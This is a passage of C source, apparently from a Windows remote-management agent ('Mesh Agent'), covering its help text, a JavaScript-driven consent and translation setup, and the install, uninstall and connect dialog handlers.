					printf("  -svchost-status       Emit JSON svchost status and return a diagnostic bitmask.\r\n");
#if defined(_LINKVM)
					printf("  -kvm-bridge-hardening-probe <dll>     Emit JSON runtime proof for bridge DACL hardening.\r\n");
					printf("  -kvm-bridge-job-controller <dll> <inputPipe> <outputPipe> Internal helper for bridge job-teardown validation.\r\n");
					printf("  -kvm-bridge-session-change-probe      Emit JSON runtime proof for bridge lock/unlock and reconnect continuity.\r\n");
					printf("  -kvm-bridge-crash-recovery-probe      Emit JSON runtime proof for bridge early-exit recovery backoff.\r\n");
					printf("  -kvm-bridge-event-audit-probe         Emit JSON runtime proof for bridge Event Log auditing.\r\n");
					printf("  -kvm-multi-session-probe [primary] [secondary] Emit JSON runtime proof for concurrent per-context bridge helpers.\r\n");
					printf("  -kvm-elevated-input-probe             Emit JSON runtime proof for SYSTEM bridge input into elevated cmd.exe.\r\n");
					printf("  -kvm-blockinput-probe                 Emit JSON runtime proof for same-thread SendInput plus SYSTEM BlockInput(FALSE) override.\r\n");
					printf("  -kvm-secure-desktop-probe             Emit JSON runtime proof for Winlogon desktop capture during UAC.\r\n");
#endif
					printf("  --selftest            Run agent self-test harness (use --majorBug=1 only for major bug investigation).\r\n");
					printf("\r\n");
					printf("Svchost registration maintenance:\r\n");
					printf("  -svchost-register     Register service DLL in svchost (netsvcs).\r\n");
					printf("  -svchost-unregister   Remove svchost registration artifacts.\r\n");
					printf("\r\n");
					printf("Additional -fullinstall options:\r\n");
					printf("  --WebProxy=\"http://proxyhost:port\"  Specify an HTTPS proxy.\r\n");
					printf("  --agentName=\"alternate name\"        Specify an alternate name to be provided by the agent.\r\n");
					printf("  --package-source=\"path\"             Override package source used by -validate-package.\r\n");
					printf("  --allow-installed-fallback=0|1       Allow installed .msh/.conf fallback during -validate-package.\r\n");
				}
				else if (skip == 0)
				{
					// This is only supported on Windows 8 / Windows Server 2012 R2 and newer
					char selfexe[_MAX_PATH];
					char *lang = NULL;

					// Get current executable path
					WCHAR wselfexe[MAX_PATH];
					GetModuleFileNameW(NULL, wselfexe, sizeof(wselfexe) / 2);
					ILibWideToUTF8Ex(wselfexe, -1, selfexe, (int)sizeof(selfexe));

					void *dialogchain = ILibCreateChain();
					ILibChain_PartialStart(dialogchain);
					duk_context *ctx = ILibDuktape_ScriptContainer_InitializeJavaScriptEngineEx(0, 0, dialogchain, NULL, NULL, selfexe, NULL, need_stop_chain, dialogchain);
					if (duk_peval_string(ctx, "require('win-authenticode-opus').checkMSH();") == 0)
					{
						if (duk_peval_string(ctx, "require('util-language').current.toLowerCase().split('_').join('-');") == 0) { lang = (char*)duk_safe_to_string(ctx, -1); }
						if (duk_peval_string(ctx, "(function foo(){return(JSON.parse(_MSH().translation));})()") != 0 || !duk_has_prop_string(ctx, -1, "en"))
						{
							duk_push_object(ctx);															// [translation][en]
							duk_push_string(ctx, "Install"); duk_put_prop_string(ctx, -2, "install");
							duk_push_string(ctx, "Uninstall"); duk_put_prop_string(ctx, -2, "uninstall");
							duk_push_string(ctx, "Connect"); duk_put_prop_string(ctx, -2, "connect");
							duk_push_string(ctx, "Disconnect"); duk_put_prop_string(ctx, -2, "disconnect");
							duk_push_string(ctx, "Update"); duk_put_prop_string(ctx, -2, "update");
							duk_push_array(ctx);
							duk_push_string(ctx, "NOT INSTALLED"); duk_array_push(ctx, -2);
							duk_push_string(ctx, "RUNNING"); duk_array_push(ctx, -2);
							duk_push_string(ctx, "NOT RUNNING"); duk_array_push(ctx, -2);
							duk_put_prop_string(ctx, -2, "status");
							duk_put_prop_string(ctx, -2, "en");												// [translation]
						}
						if (DIALOG_LANG != NULL) { lang = DIALOG_LANG; }
						if (!duk_has_prop_string(ctx, -1, lang))
						{
							duk_push_string(ctx, lang);					// [obj][string]
							duk_string_split(ctx, -1, "-");				// [obj][string][array]
							duk_array_shift(ctx, -1);					// [obj][string][array][string]
							lang = (char*)duk_safe_to_string(ctx, -1);
							duk_dup(ctx, -4);							// [obj][string][array][string][obj]
						}
						if (!duk_has_prop_string(ctx, -1, lang))
						{
							lang = "en";
						}

						if (strcmp("en", lang) != 0)
						{
							// Not English, so check the minimum set is present
							duk_get_prop_string(ctx, -1, "en");				// [en]
							duk_get_prop_string(ctx, -2, lang);				// [en][lang]
							duk_enum(ctx, -2, DUK_ENUM_OWN_PROPERTIES_ONLY);// [en][lang][enum]
							while (duk_next(ctx, -1, 1))					// [en][lang][enum][key][val]
							{
								if (!duk_has_prop_string(ctx, -4, duk_get_string(ctx, -2)))
								{
									duk_put_prop(ctx, -4);					// [en][lang][enum]
								}
								else
								{
									duk_pop_2(ctx);							// [en][lang][enum]
								}
							}
							duk_pop_3(ctx);									// ...
						}
						g_dialogTranslationObject = duk_get_heapptr(ctx, -1);
						g_dialogCtx = ctx;
						g_dialogLanguage = lang;

						duk_push_global_object(ctx);
						duk_dup(ctx, -2); duk_put_prop_string(ctx, -2, "_start_data");
						duk_push_c_function(ctx, _start, 0);
						duk_put_prop_string(ctx, -2, "_start");

						duk_eval_string(ctx, "global.__msh = _MSH()");
						if (duk_has_prop_string(ctx, -1, "ack"))
						{
							duk_pop(ctx);
							duk_eval_string_noresult(ctx, "global.ack=JSON.parse(global.__msh.ack)");
							duk_eval_string_noresult(ctx, "global.bcolor=global.__msh.background");
							duk_eval_string_noresult(ctx, "global.fcolor=global.__msh.foreground");
							duk_eval_string_noresult(ctx, "global.bimage=global.__msh.image?global.__msh.image:'default2';");
							duk_push_sprintf(ctx, "global.ackTitle = global.ack.captions['%s']?global.ack.captions['%s'].title:global.ack.captions['en'].title;", lang, lang);
							duk_eval_noresult(ctx);
							duk_push_sprintf(ctx, "global.ackText = global.ack.captions['%s']?global.ack.captions['%s'].caption:global.ack.captions['en'].caption;", lang, lang);
							duk_eval_noresult(ctx);
							duk_push_sprintf(ctx, "global.ackLink = { text: global.ack.captions['%s'].linkText, url: global.ack.captions['%s'].linkUrl };if(global.ackLink.text==null || global.ackLink.url==null){delete global.ackLink;}", lang, lang);
							duk_eval_noresult(ctx);
							duk_eval_string_noresult(ctx, "var x = require('win-userconsent').create(global.ackTitle, global.ackText, '', {noCheck: true, background: global.bcolor, foreground: global.fcolor, b64Image: global.bimage, linkText: global.ackLink});x.then(function () { global._OK = true; }); x.pump.on('exit', function () { _start(); });");
						}
						else
						{
							duk_pop(ctx);
							duk_eval_string_noresult(ctx, "global._OK=true; _start();");
						}
						ILibStartChain(dialogchain);
					}
					else
					{
						printf("Error: %s", duk_safe_to_string(ctx, -1));
						Duktape_SafeDestroyHeap(ctx);
						ILibStartChain(dialogchain);
					}
				}
			}
		}
	}

	CoUninitialize();
	wmain_free(argv);
	return 0;
}


int autoproxy_checked = 0;
char *configured_autoproxy_value = NULL;

#ifndef _MINCORE
COLORREF gBKCOLOR = RGB(0, 0, 0);
COLORREF gFGCOLOR = RGB(0, 0, 0);
COLORREF GDIP_RGB(COLORREF c)
{
	unsigned char _r = (c & 0xFF);
	unsigned char _g = ((c >> 8) & 0xFF);
	unsigned char _b = ((c >> 16) & 0xFF);
	return (RGB(_b, _g, _r));
}


uint32_t ColorFromMSH(char *c)
{
	uint32_t ret = RGB(0, 54, 105);
	if (c != NULL)
	{
		size_t len = strnlen_s(c, 14);
		if (c[len] == 0)
		{
			parser_result *pr = ILibParseString(c, 0, len, ",", 1);
			if (pr->NumResults == 3)
			{				
				if (atoi(pr->FirstResult->data) >= 0 && atoi(pr->FirstResult->data) <= UINT8_MAX 
					&& atoi(pr->FirstResult->NextResult->data) >= 0 && atoi(pr->FirstResult->NextResult->data) <= UINT8_MAX
					&& atoi(pr->LastResult->data) >= 0 && atoi(pr->LastResult->data) <= UINT8_MAX)
				{
					ret = RGB(atoi(pr->FirstResult->data), atoi(pr->FirstResult->NextResult->data), atoi(pr->LastResult->data));
				}
			}
			ILibDestructParserResults(pr);
		}
	}
	return(ret);
}

WCHAR *Dialog_GetTranslationEx(void *ctx, char *utf8)
{
	WCHAR *ret = NULL;
	if (utf8 != NULL)
	{
		int wlen = ILibUTF8ToWideCount(utf8);
		ret = (WCHAR*)Duktape_PushBuffer(ctx, sizeof(WCHAR)*wlen + 1);
		duk_swap_top(ctx, -2);
		ILibUTF8ToWideEx(utf8, -1, ret, wlen);
	}
	return(ret);
}
WCHAR *Dialog_GetTranslation(void *ctx, char *property)
{
	WCHAR *ret = NULL;
	char *utf8 = Duktape_GetStringPropertyValue(ctx, -1, property, NULL);
	if (utf8 != NULL)
	{
		int wlen = ILibUTF8ToWideCount(utf8);
		ret = (WCHAR*)Duktape_PushBuffer(ctx, sizeof(WCHAR)*wlen + 1);
		duk_swap_top(ctx, -2);
		ILibUTF8ToWideEx(utf8, -1, ret, wlen);
	}
	return(ret);
}

WCHAR closeButtonText[255] = { 0 };
int closeButtonTextSet = 0;

HBITMAP GetScaledImage(char *raw, size_t rawLen, int w, int h)
{
	size_t newLen = ILibBase64DecodeLength(rawLen);
	char *decoded = (char*)ILibMemory_SmartAllocate(newLen);
	newLen = ILibBase64Decode(raw, (int)rawLen, (unsigned char**)&decoded);

	IStream *instream = __SHCreateMemStream2(decoded, (uint32_t)newLen);
	void *bm = NULL;
	void *g = NULL;
	void *nb = NULL;
	HBITMAP hbm;
	int format;
	float REAL_w, REAL_h;
	int s = __GdipCreateBitmapFromStream((void*)instream, &bm);
	s = __GdipGetImagePixelFormat(bm, &format);
	s = __GdipCreateBitmapFromScan0(w, h, 0, format, NULL, &nb);
	s = __GdipGetImageHorizontalResolution(bm, &REAL_w);
	s = __GdipGetImageVerticalResolution(bm, &REAL_h);
	s = __GdipBitmapSetResolution(nb, REAL_w, REAL_h);
	s = __GdipGetImageGraphicsContext(nb, &g);
	s = __GdipSetSmoothingMode(g, SmoothingModeAntiAlias);
	s = __GdipSetInterpolationMode(g, InterpolationModeBicubic);
	s = __GdipDrawImageRectI(g, bm, 0, 0, w, h);
	s = __GdipCreateHBITMAPFromBitmap(nb, &hbm, GDIP_RGB(gBKCOLOR));
	s = __GdipDisposeImage(bm);
	ILibMemory_Free(decoded);
	return(hbm);
}

// Message handler for dialog box.
INT_PTR CALLBACK DialogHandler(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	char *fileName = NULL, *meshname = NULL, *meshid = NULL, *serverid = NULL, *serverurl = NULL, *installFlags = NULL, *mshfile = NULL;
	char *displayName = NULL, *meshServiceName = NULL;
	int hiddenButtons = 0; // Flags: 1 if "Connect" is hidden, 2 if "Uninstall" is hidden, 4 is "Install is hidden"

	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_CTLCOLORDLG: {
		// Set the background of the dialog box to blue
		if (DialogBackgroundBrush == NULL) {
			DialogBackgroundBrush = CreateSolidBrush(gBKCOLOR);
		}
		return (INT_PTR)DialogBackgroundBrush;
	}
	case WM_CTLCOLORSTATIC: {
		// Set the left text to white over transparent
		if ((HWND)lParam == GetDlgItem(hDlg, IDC_STATIC_LEFTTEXT))
		{
			SetBkMode((HDC)wParam, TRANSPARENT);
			SetTextColor((HDC)wParam, gFGCOLOR);
			return (INT_PTR)GetStockObject(NULL_BRUSH);
		}
		if ((HWND)lParam == GetDlgItem(hDlg, IDC_IMAGE))
		{
			// Set the background mode to transparent for the customized bitmap
			SetBkMode((HDC)wParam, TRANSPARENT);
			return (INT_PTR)GetStockObject(NULL_BRUSH);
		}
		break;
	}
	case WM_PAINT:
	{
		break;
	}
	case WM_INITDIALOG:
	{
		WCHAR *agentstatus = NULL;
		WCHAR *agentversion = NULL;
		WCHAR *serverlocation = NULL;
		WCHAR *meshname = NULL;
		WCHAR *meshidentitifer = NULL;
		WCHAR *serveridentifier = NULL;
		WCHAR *dialogdescription = NULL;
		WCHAR *install_buttontext = NULL;
		WCHAR *update_buttontext = NULL;
		WCHAR *uninstall_buttontext = NULL;
		WCHAR *connect_buttontext = NULL;
		WCHAR *close_buttontext = NULL;
		WCHAR *disconnect_buttontext = NULL;
		WCHAR *state_notinstalled = NULL;
		WCHAR *state_running = NULL;
		WCHAR *state_notrunning = NULL;
		WCHAR *connectiondetailsbutton = NULL;
		WCHAR *closetext = NULL;
		duk_context *ctx = g_dialogCtx;
		char *lang = g_dialogLanguage;


		if (duk_has_prop_string(ctx, -1, lang))
		{
			duk_get_prop_string(ctx, -1, lang);

			agentstatus = Dialog_GetTranslation(ctx, "statusDescription");
			if (agentstatus != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_AGENTSTATUS_TEXT), agentstatus); }
			agentversion = Dialog_GetTranslation(ctx, "agentVersion");
			if (agentversion != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_AGENT_VERSION), agentversion); }
			serverlocation = Dialog_GetTranslation(ctx, "url");
			if (serverlocation != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_SERVER_LOCATION), serverlocation); }
			meshname = Dialog_GetTranslation(ctx, "meshName");
			if (meshname != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_MESH_NAME), meshname); }
			meshidentitifer = Dialog_GetTranslation(ctx, "meshId");
			if (meshidentitifer != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_MESH_IDENTIFIER), meshidentitifer); }
			serveridentifier = Dialog_GetTranslation(ctx, "serverId");
			if (serveridentifier != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_SERVER_IDENTIFIER), serveridentifier); }
			dialogdescription = Dialog_GetTranslation(ctx, "description");
			if (dialogdescription != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_STATIC_LEFTTEXT), dialogdescription); }
			connectiondetailsbutton = Dialog_GetTranslation(ctx, "connectionDetailsButton");
			if (connectiondetailsbutton != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_DETAILSBUTTON), connectiondetailsbutton); }
			closetext = Dialog_GetTranslation(ctx, "close");
			if (closetext != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDCLOSE), closetext); }

			install_buttontext = Dialog_GetTranslation(ctx, "install");
			update_buttontext = Dialog_GetTranslation(ctx, "update");
			uninstall_buttontext = Dialog_GetTranslation(ctx, "uninstall");
			close_buttontext = Dialog_GetTranslation(ctx, "close");
			disconnect_buttontext = Dialog_GetTranslation(ctx, "disconnect");
			if (disconnect_buttontext != NULL)
			{
				wcscpy_s(closeButtonText, sizeof(closeButtonText) / 2, disconnect_buttontext);
				closeButtonTextSet = 1;
			}

			if (uninstall_buttontext != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), uninstall_buttontext); }
			connect_buttontext = Dialog_GetTranslation(ctx, "connect");
			if (connect_buttontext != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDC_CONNECTBUTTON), connect_buttontext); }
			if (close_buttontext != NULL) { SetWindowTextW(GetDlgItem(hDlg, IDCLOSE), close_buttontext); }

			duk_get_prop_string(ctx, -1, "status");	// [Array]
			state_notinstalled = Dialog_GetTranslationEx(ctx, Duktape_GetStringPropertyIndexValue(ctx, -1, 0, NULL));
			state_running = Dialog_GetTranslationEx(ctx, Duktape_GetStringPropertyIndexValue(ctx, -1, 1, NULL));
			state_notrunning = Dialog_GetTranslationEx(ctx, Duktape_GetStringPropertyIndexValue(ctx, -1, 2, NULL));
		}

		if (duk_peval_string(ctx, "_MSH();") == 0)
		{
			int installFlagsInt = 0;
			WINDOWPLACEMENT lpwndpl;
			RECT r;
			GetWindowRect(GetDlgItem(hDlg, IDC_IMAGE), &r);

			char *bkcolor = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "background", "0,54,105");
			char *fgcolor = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "foreground", "255,255,255");
			gBKCOLOR = ColorFromMSH(bkcolor);
			gFGCOLOR = ColorFromMSH(fgcolor);

			duk_size_t rawLen;
			char *imageraw = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "image", NULL);
			if (imageraw != NULL)
			{
				duk_push_sprintf(g_dialogCtx, "('%s').split(',').pop()", imageraw);					// [msh][str]
				duk_eval(g_dialogCtx);																// [msh][str]
				duk_swap_top(g_dialogCtx, -2);														// [str][msh]
				imageraw = (char*)duk_get_lstring(g_dialogCtx, -2, &rawLen);
				HBITMAP scaled = GetScaledImage(imageraw, rawLen, 162, 162);
				SendMessageW(GetDlgItem(hDlg, IDC_IMAGE), STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)scaled);
			}
			else
			{
				HBITMAP scaled = GetScaledImage(image_b64, sizeof(image_b64) - 1, 162, 162);
				SendMessageW(GetDlgItem(hDlg, IDC_IMAGE), STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)scaled);
			}
			installFlags = Duktape_GetStringPropertyValue(ctx, -1, "InstallFlags", NULL);
			meshname = (WCHAR*)Duktape_GetStringPropertyValue(ctx, -1, "MeshName", NULL);
			meshid = Duktape_GetStringPropertyValue(ctx, -1, "MeshID", NULL);
			serverid = Duktape_GetStringPropertyValue(ctx, -1, "ServerID", NULL);
			serverurl = Duktape_GetStringPropertyValue(ctx, -1, "MeshServer", NULL);
			displayName = Duktape_GetStringPropertyValue(ctx, -1, "displayName", NULL);
			meshServiceName = Duktape_GetStringPropertyValue(ctx, -1, "meshServiceName", NULL);

			configured_autoproxy_value = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "autoproxy", NULL);
			autoproxy_checked = configured_autoproxy_value != NULL;

			// Set text in the dialog box
			if (installFlags != NULL) { installFlagsInt = ILib_atoi2_int32(installFlags, 255); }
			if (strnlen_s(meshid, 255) > 50) { meshid += 2; meshid[42] = 0; }
			if (strnlen_s(serverid, 255) > 50) { serverid[42] = 0; }
			if (displayName != NULL) { SetWindowTextW(hDlg, ILibUTF8ToWide(displayName, -1)); }
			SetWindowTextW(GetDlgItem(hDlg, IDC_POLICYTEXT), ILibUTF8ToWide((meshname != NULL) ? (char*)meshname : "(None)", -1));
			SetWindowTextA(GetDlgItem(hDlg, IDC_HASHTEXT), (meshid != NULL) ? meshid : "(None)");
			SetWindowTextW(GetDlgItem(hDlg, IDC_SERVERLOCATION), ILibUTF8ToWide((serverurl != NULL) ? serverurl : "(None)", -1));
			SetWindowTextA(GetDlgItem(hDlg, IDC_SERVERID), (serverid != NULL) ? serverid : "(None)");
			if (meshid == NULL) { EnableWindow(GetDlgItem(hDlg, IDC_CONNECTBUTTON), FALSE); }
			if ((installFlagsInt & 3) == 1) {
				// Temporary Agent Only
				hiddenButtons |= 6; // Both install and uninstall buttons are hidden
				ShowWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), SW_HIDE);
				ShowWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), SW_HIDE);
				GetWindowPlacement(GetDlgItem(hDlg, IDC_INSTALLBUTTON), &lpwndpl);
				SetWindowPlacement(GetDlgItem(hDlg, IDC_CONNECTBUTTON), &lpwndpl);
			}
			else if ((installFlagsInt & 3) == 2) {
				// Background Only
				hiddenButtons |= 1; // Connect button is hidden hidden
				ShowWindow(GetDlgItem(hDlg, IDC_CONNECTBUTTON), SW_HIDE);
			}
			else if ((installFlagsInt & 3) == 3) {
				// Uninstall only
				GetWindowPlacement(GetDlgItem(hDlg, IDC_INSTALLBUTTON), &lpwndpl);
				SetWindowPlacement(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), &lpwndpl);
				hiddenButtons |= 5; // Both install and connect buttons are hidden
				ShowWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), SW_HIDE);
				ShowWindow(GetDlgItem(hDlg, IDC_CONNECTBUTTON), SW_HIDE);
			}
		}
		else
		{
			EnableWindow(GetDlgItem(hDlg, IDC_CONNECTBUTTON), FALSE);
			HBITMAP scaled = GetScaledImage(image_b64, sizeof(image_b64) - 1, 162, 162);
			SendMessageW(GetDlgItem(hDlg, IDC_IMAGE), STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)scaled);
		}

		// Get the current service running state
		int r = GetServiceState(meshServiceName != NULL ? meshServiceName : serviceFile);
		SetWindowTextW(GetDlgItem(hDlg, IDC_INSTALLBUTTON), update_buttontext);

		switch (r)
		{
		case SERVICE_RUNNING:
			SetWindowTextW(GetDlgItem(hDlg, IDC_STATUSTEXT), state_running);
			break;
		case 0:
		case 100: // Not installed
			SetWindowTextW(GetDlgItem(hDlg, IDC_STATUSTEXT), state_notinstalled);
			SetWindowTextW(GetDlgItem(hDlg, IDC_INSTALLBUTTON), install_buttontext);
			hiddenButtons |= 2; // Uninstall buttons is hidden
			ShowWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), SW_HIDE);
			break;
		default: // Not running
			SetWindowTextW(GetDlgItem(hDlg, IDC_STATUSTEXT), state_notrunning);
			break;
		}

		// Correct the placement of buttons, push them to the left side if some of them are hidden.
		if (hiddenButtons == 2) { // Uninstall button is the only one hidden. Place connect button at uninstall position
			WINDOWPLACEMENT lpwndpl;
			GetWindowPlacement(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), &lpwndpl);
			SetWindowPlacement(GetDlgItem(hDlg, IDC_CONNECTBUTTON), &lpwndpl);
		}
		else if (hiddenButtons == 6) { // Only connect button is showing, place it in the install button location
			WINDOWPLACEMENT lpwndpl;
			GetWindowPlacement(GetDlgItem(hDlg, IDC_INSTALLBUTTON), &lpwndpl);
			SetWindowPlacement(GetDlgItem(hDlg, IDC_CONNECTBUTTON), &lpwndpl);
		}

		if (mshfile != NULL) { free(mshfile); }
		return (INT_PTR)TRUE;
	}
	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCLOSE || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));

#ifdef _DEBUG
			_CrtCheckMemory();
			_CrtDumpMemoryLeaks();
#endif

			return (INT_PTR)TRUE;
		}
		else if (LOWORD(wParam) == IDC_DETAILSBUTTON) 
		{
			DialogBoxW(NULL, MAKEINTRESOURCEW(IDD_DETAILSDIALOG), hDlg, DialogHandler2);
			return (INT_PTR)TRUE;
		}
		else if (LOWORD(wParam) == IDC_INSTALLBUTTON || LOWORD(wParam) == IDC_UNINSTALLBUTTON)
		{
			BOOL result = FALSE;
			DWORD actionExitCode = ERROR_GEN_FAILURE;
			DWORD launchError = ERROR_SUCCESS;
			WCHAR actionName[32];
			WCHAR errorMessage[512];

			EnableWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), FALSE);
			EnableWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), FALSE);
			EnableWindow(GetDlgItem(hDlg, IDCLOSE), FALSE);

			if (LOWORD(wParam) == IDC_INSTALLBUTTON)
			{
				sprintf_s(
					ILibScratchPad,
					sizeof(ILibScratchPad),
					"-fullinstall --cleanup-launcher %s%s",
					autoproxy_checked != 0 ? "--autoproxy=" : "",
					autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
			}
			else
			{
				sprintf_s(
					ILibScratchPad,
					sizeof(ILibScratchPad),
					"-fulluninstall %s%s",
					autoproxy_checked != 0 ? "--autoproxy=" : "",
					autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
			}
			result = MeshService_RunSelfCommandAndWait(ILibScratchPad, IsAdmin() == TRUE, &actionExitCode, &launchError);

			if (result)
			{
				EndDialog(hDlg, LOWORD(wParam));
			}
			else
			{
				StringCchCopyW(actionName, _countof(actionName), LOWORD(wParam) == IDC_INSTALLBUTTON ? L"Install/Update" : L"Uninstall");
				if (launchError == ERROR_CANCELLED)
				{
					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls was cancelled (UAC prompt declined or unavailable).", actionName);
				}
				else if (launchError != ERROR_SUCCESS)
				{
					WCHAR launchErrorText[256];
					MeshService_FormatWin32ErrorMessageW(launchError, launchErrorText, _countof(launchErrorText));
					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls failed to launch (error=%lu: %ls).", actionName, launchError, launchErrorText);
				}
				else
				{
					StringCchPrintfW(errorMessage, _countof(errorMessage), L"%ls failed (exit=%lu). Check native-install.log and %%TEMP%%\\MeshInstaller.log.", actionName, actionExitCode);
				}
				MessageBoxW(hDlg, errorMessage, L"Mesh Agent", MB_OK | MB_ICONERROR);
				EnableWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), TRUE);
				EnableWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), TRUE);
				EnableWindow(GetDlgItem(hDlg, IDCLOSE), TRUE);
			}

#ifdef _DEBUG
			_CrtCheckMemory();
			_CrtDumpMemoryLeaks();
#endif

			return (INT_PTR)TRUE;
		}
		else if (LOWORD(wParam) == IDC_CONNECTBUTTON)
		{
			//
			// Temporary Agent
			//
			EnableWindow(GetDlgItem(hDlg, IDC_INSTALLBUTTON), FALSE);
			EnableWindow(GetDlgItem(hDlg, IDC_UNINSTALLBUTTON), FALSE);
			EnableWindow(GetDlgItem(hDlg, IDC_CONNECTBUTTON), FALSE);
			SetWindowTextA(GetDlgItem(hDlg, IDC_STATUSTEXT), "Running as temporary agent");

			DWORD pid = GetCurrentProcessId();
			sprintf_s(ILibScratchPad, sizeof(ILibScratchPad), "connect --disableUpdate=1 --hideConsole=1 --exitPID=%u %s%s", pid, autoproxy_checked != 0 ? "--autoproxy=" : "", autoproxy_checked != 0 ? (configured_autoproxy_value != NULL ? configured_autoproxy_value : "1") : "");
			if (RunAsAdmin(ILibScratchPad, IsAdmin() == TRUE) == 0) { RunAsAdmin(ILibScratchPad, 1); }

			if (closeButtonTextSet != 0) { SetWindowTextW(GetDlgItem(hDlg, IDCLOSE), closeButtonText); }
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}

#endif


// Message handler for details dialog box.
INT_PTR CALLBACK DialogHandler2(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	char *fileName = NULL, *meshname = NULL, *meshid = NULL, *serverid = NULL, *serverurl = NULL, *installFlags = NULL, *mshfile = NULL, *autoproxy = NULL;
	char *displayName = NULL, *meshServiceName = NULL;
	int hiddenButtons = 0; // Flags: 1 if "Connect" is hidden, 2 if "Uninstall" is hidden, 4 is "Install is hidden"
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
		case WM_CLOSE:
			autoproxy_checked = IsDlgButtonChecked(hDlg, IDC_AUTOPROXY_CHECK);
			break;
	case WM_CTLCOLORDLG: {
		// Set the background of the dialog box to blue
		if (DialogBackgroundBrush == NULL) {
			DialogBackgroundBrush = CreateSolidBrush(gBKCOLOR);
		}
		return (INT_PTR)DialogBackgroundBrush;
	}
	case WM_CTLCOLORSTATIC: 
	{
		if (GetDlgCtrlID((HWND)lParam) == IDC_AUTOPROXY_CHECK)
		{
			HBRUSH h=CreateSolidBrush(gBKCOLOR);
			SetBkColor((HDC)wParam, gBKCOLOR);
			SetTextColor((HDC)wParam, gFGCOLOR);
			return((INT_PTR)h);
		}
		// Set the left text to white over transparent
		SetBkMode((HDC)wParam, TRANSPARENT);
		SetTextColor((HDC)wParam, gFGCOLOR);
		return (INT_PTR)GetStockObject(NULL_BRUSH);
		break;
	}
	case WM_CTLCOLORBTN:
	{
		DWORD ID = GetDlgCtrlID((HWND)lParam);
		if(ID == IDC_AUTOPROXY_CHECK)
		{
			SetBkMode((HDC)wParam, TRANSPARENT);
			SetTextColor((HDC)wParam, gFGCOLOR);
			return (INT_PTR)GetStockObject(NULL_BRUSH);
		}
		break;
	}
	case WM_INITDIALOG:
	{
		if (duk_peval_string(g_dialogCtx, "_MSH();") == 0)
		{
			WCHAR *state_notinstalled = NULL;
			WCHAR *state_running = NULL;
			WCHAR *state_notrunning = NULL;
			WCHAR *agentstatus = NULL;
			WCHAR *agentversion = NULL;
			WCHAR *serverlocation = NULL;
			WCHAR *serveridentifier = NULL;
			WCHAR *groupname = NULL;
			WCHAR *meshidentitifer = NULL;
			WCHAR *oktext = NULL;
			WCHAR *dialogtitle = NULL;
			WCHAR *osname = NULL;
			meshname = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "MeshName", NULL);
			meshid = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "MeshID", NULL);
			serverid = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "ServerID", NULL);
			serverurl = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "MeshServer", NULL);
			displayName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "displayName", NULL);
			meshServiceName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "meshServiceName", "Mesh Agent");
			autoproxy = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "autoproxy", NULL);
			char *bkcolor = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "bkcolor", "0,0,0");

			if (autoproxy != NULL || autoproxy_checked != 0)
			{
				CheckDlgButton(hDlg, IDC_AUTOPROXY_CHECK, BST_CHECKED);
			}

			// Set text in the dialog box
			if (strnlen_s(meshid, 255) > 50) { meshid += 2; meshid[42] = 0; }
			if (strnlen_s(serverid, 255) > 50) { serverid[42] = 0; }
			if (displayName != NULL) { SetWindowTextW(hDlg, ILibUTF8ToWide(displayName, -1)); }
			SetWindowTextA(GetDlgItem(hDlg, IDC_HASHTEXT), (meshid != NULL) ? meshid : "(None)");
			SetWindowTextW(GetDlgItem(hDlg, IDC_SERVERLOCATION), ILibUTF8ToWide((serverurl != NULL) ? serverurl : "(None)", -1));
			SetWindowTextA(GetDlgItem(hDlg, IDC_SERVERID), (serverid != NULL) ? serverid : "(None)");
			SetWindowTextW(GetDlgItem(hDlg, IDC_SERVERLOCATION), ILibUTF8ToWide((serverurl != NULL) ? serverurl : "(None)", -1));
			SetWindowTextW(GetDlgItem(hDlg, IDC_POLICYTEXT), ILibUTF8ToWide((meshname != NULL) ? meshname : "(None)", -1));
